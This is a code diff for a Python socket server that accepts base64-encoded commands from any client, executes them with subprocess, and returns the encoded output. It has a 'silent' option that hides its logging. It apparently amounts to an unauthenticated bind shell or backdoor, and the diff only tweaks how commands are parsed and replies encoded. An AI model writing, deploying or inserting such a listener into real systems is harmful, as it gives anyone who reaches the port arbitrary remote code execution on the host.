@@ -23,19 +23,17 @@ s.listen(10)
 
 def handle_client(client_socket):
     request = base64.b64decode(client_socket.recv(4096))
-
+    print(request)
     if not silent:
         print("Recieved command: %s" %(request))
     args = request.split()
-    print(args)
     try:
-        output=subprocess.check_output(request)
+        output=subprocess.check_output(args)
+        print(output)
     except Exception as e:
         print('Error while executing command')
         print(e)
-    client_socket.send(base64.b64encode(output.encode('ASCII')))
-    client_socket.recv(4096)
-#    client_socket.close()
+    client_socket.send(base64.b64encode(output))
 
 while True:
     client, addr = s.accept()
@@ -43,3 +41,5 @@ while True:
         print("Accepted connection from: %s" %(addr)[0])
     client_handler = threading.Thread(target=handle_client(client,),)
     client_handler.start()
+
+s.close()
